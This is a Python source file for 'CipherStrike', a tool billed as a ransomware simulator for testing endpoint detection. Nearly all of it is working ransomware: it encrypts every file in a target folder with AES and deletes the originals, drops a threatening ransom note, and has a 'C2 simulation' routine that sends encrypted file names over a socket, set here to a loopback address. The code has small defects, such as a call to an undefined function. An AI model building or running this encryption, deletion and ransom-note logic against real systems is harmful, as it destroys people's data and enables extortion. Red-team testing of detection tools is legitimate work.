# ----- License -------------------------------------------------- # 

#  CipherStrike - CipherStrike simulates ransomware attacks to test EDR systems, enabling users to strengthen their defense strategies.
#  Copyright (c) 2025 - CursedSec (Operated by Cursed271). All rights reserved.

#  This software is an proprietary intellectual property developed for
#  penetration testing, threat modeling, and security research. It   
#  is licensed under the CURSEDSEC OWNERSHIP EDICT:
#
#  🚫 PROHIBITION WARNING 🚫
#  Redistribution, re-uploading, and unauthorized modification are strictly forbidden 
#  under the COE. Use is granted ONLY under the limited terms defined in the official 
#  LICENSE file (COE), which must be included in all copies.

#  DISCLAIMER:
#  This tool is intended for **educational or ethical testing** purposes only.
#  Unauthorized or malicious use of this software against systems without 
#  proper authorization is strictly prohibited and may violate laws and regulations.
#  The author assumes no liability for misuse or damage caused by this tool.

#  🔗 LICENSE: CURSEDSEC OWNERSHIP EDICT (COE)
#  🔗 Repository: https://github.com/Cursed271
#  🔗 Author: Steven Pereira (@Cursed271)

# ----- Libraries ------------------------------------------------ #

import os
import socket
import hashlib
from rich.console import Console
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# ----- Global Declaration --------------------------------------- #

c2_port = 2701
console = Console()
c2_host = "127.0.0.1"
password = "1234567890"
target_folder = "Important Data"

# ----- Key Function --------------------------------------------- #

def derive_key(password):
	return hashlib.sha256(password.encode()).digest()

# ----- Ransom Note ---------------------------------------------- #

def ransom_note():
	note = """
┌──────────────────────────────────────────────────────────────┐
│                        !!! ATTENTION !!!                     │
└──────────────────────────────────────────────────────────────┘

All your important files have been ENCRYPTED by CipherStrike.

Your documents, photos, databases, and other critical data are now
inaccessible. This is not a joke. DO NOT attempt to modify or rename 
the encrypted files — doing so may result in permanent data loss.

▶ HOW TO RECOVER YOUR FILES:
	- You must obtain the decryption password.
	- Without it, your files are lost forever.

▶ WHAT TO DO NEXT:
	- Contact your internal cybersecurity team immediately.
	- Refer to your organization’s Incident Response Plan.
	- DO NOT attempt to decrypt the files using third-party tools.

▶ REMEMBER:
	- We are watching. 
	- Tick-tock... your time is running out.

┌────────────────────────────────────────────────────────────────┐
│                    CipherStrike - By Cursed                    │
└────────────────────────────────────────────────────────────────┘
    """
	with open("README_RESTORE_FILES.txt", "w") as f:
		f.write(note)

# ----- C2 Simulation -------------------------------------------- #

def c2_simulation():
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM)as s:
			s.connect((c2_host, c2_port))
			for filename in os.listdir(target_folder):
				if filename.endswith(".enc"):
					sample = filename.encode()[:64]
					s.sendall(sample + b"\n")
		console.print("[blue][*] C2 exfiltration completed.")
	except Exception as e:
		console.print(f"[red][!] Failed to connect to the C2 Server: {e}")

# ----- Encrypt Function ----------------------------------------- #

def encrypt(data, key):
	iv = os.urandom(16)
	cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
	encryptor = cipher.encryptor()
	return iv + encryptor.update(data) + encryptor.finalize()

def encrypt_data():
	for filename in os.listdir(target_folder):
		path = os.path.join(target_folder, filename)
		with open(path, 'rb') as f:
			data = f.read()
		encrypted = encrypt(data, key)
		with open(path + ".enc", 'wb') as f:
			f.write(encrypted)
		os.remove(path)
	console.print("[green][+] All files encrypted successfully.")	

# ----- Decrypt Function ----------------------------------------- #

def decrypt(data, key):
	iv = data[:16]
	cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
	decryptor = cipher.decryptor()
	return decryptor.update(data[16:]) + decryptor.finalize() 

def decrypt_data():
	user_input = console.input(rf"[#C6ECE3][?] Enter decryption password: ").strip()
	if user_input != password:
		console.print("[red][!] You have entered the wrong password. View the Ransom Note. Please contact your system administrator or InfoSec Team immediately.")
		ransom_note()
		return
	key = derive_key(password)
	failed_count = 0
	total_files = 0
	for filename in os.listdir(target_folder):
		if not filename.endswith(".enc"):
			continue
		total_files += 1
		path = os.path.join(target_folder, filename)
		try:
			with open(path, 'rb') as f:
				data = f.read()
			decrypted = decrypt(data, key)
			original_name = path.replace(".enc", "")
			with open(original_name, 'wb') as f:
				f.write(decrypted)
			os.remove(path)
		except Exception:
			failed_count += 1
	if failed_count == total_files:
		drop_ransom_note()
	elif failed_count > 0:
		console.print(f"[red][!] Some files couldn't be decrypted. Check your password or file integrity.")
	else:
		console.print("[green][+] Files decrypted successfully.")	

# ----- Menu Function -------------------------------------------- #

def menu():
	console.print(f"[green][+] Ransomware to test EDR Capability. Choose the CipherStrike Mode:")
	console.print(f"  [#C6ECE3][>] 1. Encryption")
	console.print(f"  [#C6ECE3][>] 2. Decryption")
	console.print(f"  [#C6ECE3][>] 3. C2 Simulation")
	choice = console.input(rf"[#C6ECE3][?] Mode: ").strip()
	if choice not in ["1", "2", "3", "4"]:
		console.print("[red][-] Invalid mode selected.")
		return
	if choice == "1":
		encrypt_data()
	elif choice == "2":
		decrypt_data()
	elif choice == "3":
		c2_simulation()
	else:
		console.print(f"[red][-] Exiting CipherStrike.....")
		exit(0)

# ----- Banner --------------------------------------------------- #

def ascii():
	console.print(rf"""[#C6ECE3]
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                                                             │
│      .oooooo.    o8o             oooo                            .oooooo..o     .             o8o  oooo                     │ 
│     d8P'  `Y8b   `"'             `888                           d8P'    `Y8   .o8             `"'  `888                     │ 
│    888          oooo  oo.ooooo.   888 .oo.    .ooooo.  oooo d8b Y88bo.      .o888oo oooo d8b oooo   888  oooo   .ooooo.     │ 
│    888          `888   888' `88b  888P"Y88b  d88' `88b `888""8P  `"Y8888o.    888   `888""8P `888   888 .8P'   d88' `88b    │ 
│    888           888   888   888  888   888  888ooo888  888          `"Y88b   888    888      888   888888.    888ooo888    │ 
│    `88b    ooo   888   888   888  888   888  888    .o  888     oo     .d8P   888 .  888      888   888 `88b.  888    .o    │ 
│     `Y8bood8P'  o888o  888bod8P' o888o o888o `Y8bod8P' d888b    8""88888P'    "888" d888b    o888o o888o o888o `Y8bod8P'    │
│                        888                                                                                                  │
│                       o888o                                                                                                 │
│                                                                                                                             │
└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
	""")
	console.print(rf"[#C6ECE3]+--------------------------------------------------------------+")
	console.print(rf"[#C6ECE3]  CipherStrike - Test Defenses. Simulate Threats. Strike Silently.")
	console.print(rf"[#C6ECE3]  Created by [bold black]Cursed271")
	console.print(rf"[#C6ECE3]+--------------------------------------------------------------+")

# ----- Main Function -------------------------------------------- #

if __name__ == "__main__":
	os.system("cls" if os.name == "nt" else "clear")
	key = derive_key(password)
	ascii()
	menu()
	console.print(rf"[#C6ECE3]+--------------------------------------------------------------+")

# ----- End ------------------------------------------------------ #
